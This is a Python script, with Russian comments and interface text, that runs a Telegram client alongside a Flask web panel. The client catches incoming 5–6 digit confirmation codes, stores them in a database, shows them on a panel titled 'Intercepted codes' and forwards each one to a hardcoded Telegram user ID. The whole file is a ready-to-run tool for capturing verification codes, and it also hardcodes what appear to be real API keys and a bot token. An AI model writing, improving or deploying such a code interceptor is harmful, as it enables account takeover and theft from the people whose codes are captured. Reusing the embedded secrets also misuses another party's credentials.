import asyncio
import sqlite3
from datetime import datetime
from flask import Flask, render_template_string
from telethon import TelegramClient, events
import threading

# ========== ВСТАВЬТЕ ВАШИ НОВЫЕ ДАННЫЕ ==========
API_ID = 28687552             # <- ВСТАВЬТЕ НОВЫЙ API ID
API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"  # <- ВСТАВЬТЕ НОВЫЙ API HASH
BOT_TOKEN = "8611748903:AAGxBTXL74UfjsO26s5ZT4h6mts2VwCBpU0"  # <- ВСТАВЬТЕ НОВЫЙ ТОКЕН
TARGET_ID = 174415647
# ================================================

app = Flask(__name__)

# Создаём базу данных
conn = sqlite3.connect("codes.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("CREATE TABLE IF NOT EXISTS codes (id INTEGER PRIMARY KEY, code TEXT, timestamp TEXT)")
conn.commit()

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Коды подтверждения</title>
    <meta http-equiv="refresh" content="5">
    <style>
        body { font-family: monospace; padding: 20px; background: #0f0f0f; color: #0f0; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #0f0; padding: 8px; text-align: left; }
        th { background: #1f1f1f; }
        .code { font-size: 24px; font-weight: bold; }
    </style>
</head>
<body>
    <h1>📨 Перехваченные коды</h1>
    <table>
        <tr><th>ID</th><th>Код</th><th>Время</th></tr>
        {% for row in rows %}
        <tr>
            <td>{{ row[0] }}</td>
            <td class="code">{{ row[1] }}</td>
            <td>{{ row[2] }}</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

@app.route("/")
def index():
    cursor.execute("SELECT * FROM codes ORDER BY id DESC LIMIT 50")
    rows = cursor.fetchall()
    return render_template_string(HTML, rows=rows)

def save_code(code):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("INSERT INTO codes (code, timestamp) VALUES (?, ?)", (code, timestamp))
    conn.commit()

client = TelegramClient("user_session", API_ID, API_HASH)

@client.on(events.NewMessage(pattern='/start'))
async def start_command(event):
    await event.reply(
        "🤖 *Бот запущен и работает*\n\n"
        "📨 Я слушаю входящие сообщения и пересылаю коды подтверждения.\n"
        "🔐 Когда приходит код (5-6 цифр), он сохраняется в админ-панель и отправляется на указанный ID.\n\n"
        "🌐 Админ-панель доступна по адресу: http://localhost:5000",
        parse_mode='markdown'
    )

@client.on(events.NewMessage)
async def forward_code(event):
    text = event.raw_text
    if text and text.startswith('/'):
        return
    if text and text.isdigit() and len(text) in (5, 6):
        save_code(text)
        await client.send_message(TARGET_ID, f"🔐 Код: `{text}`")
        print(f"[+] Код сохранён и отправлен: {text}")

async def run_telegram():
    await client.start(bot_token=BOT_TOKEN)
    print("✅ Telegram бот запущен")
    print("📨 Бот слушает сообщения...")
    print("🌐 Админ-панель: http://localhost:5000")
    await client.run_until_disconnected()

def run_flask():
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    asyncio.run(run_telegram())
